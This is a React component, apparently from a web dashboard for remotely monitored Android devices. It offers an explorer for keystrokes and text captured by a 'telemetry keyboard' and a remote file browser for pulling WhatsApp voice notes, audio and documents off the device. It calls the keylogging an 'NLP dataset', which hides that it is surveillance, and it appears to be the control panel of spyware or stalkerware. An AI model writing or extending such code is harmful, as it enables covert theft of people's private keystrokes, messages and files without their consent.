'use client';

import React, { useState, useEffect } from 'react';

interface DeviceModuleHubProps {
  deviceId: string;
  onSelectModule: (view: 'nlp' | 'files') => void;
  onBack: () => void;
}

export const DeviceModuleHub: React.FC<DeviceModuleHubProps> = ({
  deviceId,
  onSelectModule,
  onBack
}) => {
  const [deviceInfo, setDeviceInfo] = useState<{
    model?: string;
    android_version?: string;
    last_seen?: string;
    total_files?: number;
  }>({});

  useEffect(() => {
    fetch(`/api/telemetry/pending-downloads?deviceId=${encodeURIComponent(deviceId)}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.success && data.device_info) {
          setDeviceInfo(data.device_info);
        }
      })
      .catch(() => {});
  }, [deviceId]);

  return (
    <div className="w-full max-w-6xl mx-auto p-6">
      {/* Header with Back Button */}
      <div className="flex items-center justify-between mb-8 pb-4 border-b border-gray-200">
        <div>
          <button
            onClick={onBack}
            className="text-sm font-medium text-blue-600 hover:text-blue-800 flex items-center gap-1 mb-2"
          >
            &larr; Volver al Listado de Dispositivos
          </button>
          <h1 className="text-2xl font-bold text-gray-900">Hub de Seleccion de Modulo</h1>
          <p className="text-sm text-gray-500">
            Dispositivo Identificador: <span className="font-mono font-semibold text-gray-700">{deviceId}</span>
          </p>
        </div>
        <div className="text-right">
          <span className="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-green-100 text-green-800">
            Dispositivo Conectado
          </span>
        </div>
      </div>

      {/* Grid of 2 Modules */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
        {/* Module 1: Dataset NLP */}
        <div className="bg-white rounded-2xl p-6 border border-gray-200 shadow-sm hover:shadow-md transition-shadow flex flex-col justify-between">
          <div>
            <div className="w-12 h-12 rounded-xl bg-blue-50 flex items-center justify-center text-blue-600 font-bold text-xl mb-4">
              NLP
            </div>
            <h2 className="text-xl font-bold text-gray-900 mb-2">Explorador Dataset NLP</h2>
            <p className="text-sm text-gray-600 mb-6 leading-relaxed">
              Accede a los registros de texto y pulsaciones capturados por el teclado de telemetria. Analiza secuencias de lenguaje humano y estructuras de pulsaciones.
            </p>
            <div className="bg-gray-50 rounded-xl p-4 mb-6">
              <div className="text-xs text-gray-500 font-medium uppercase mb-1">Modulo Activo</div>
              <div className="text-lg font-semibold text-gray-800">Registros de Teclado</div>
            </div>
          </div>
          <button
            onClick={() => onSelectModule('nlp')}
            className="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-xl transition-colors text-center shadow-sm"
          >
            Abrir Explorador Dataset NLP
          </button>
        </div>

        {/* Module 2: File Explorer */}
        <div className="bg-white rounded-2xl p-6 border border-gray-200 shadow-sm hover:shadow-md transition-shadow flex flex-col justify-between">
          <div>
            <div className="w-12 h-12 rounded-xl bg-emerald-50 flex items-center justify-center text-emerald-600 font-bold text-xl mb-4">
              DOC
            </div>
            <h2 className="text-xl font-bold text-gray-900 mb-2">Explorador de Archivos</h2>
            <p className="text-sm text-gray-600 mb-6 leading-relaxed">
              Explora el arbol de carpetas del dispositivo remoto. Selecciona notas de voz de WhatsApp (.opus), audios y documentos para sincronizar y reproducir en la web.
            </p>
            <div className="bg-gray-50 rounded-xl p-4 mb-6">
              <div className="text-xs text-gray-500 font-medium uppercase mb-1">Sincronizacion Secuencial</div>
              <div className="text-lg font-semibold text-gray-800">Archivos, Audios &amp; Opus</div>
            </div>
          </div>
          <button
            onClick={() => onSelectModule('files')}
            className="w-full py-3 px-4 bg-emerald-600 hover:bg-emerald-700 text-white font-medium rounded-xl transition-colors text-center shadow-sm"
          >
            Abrir Explorador de Archivos
          </button>
        </div>
      </div>
    </div>
  );
};
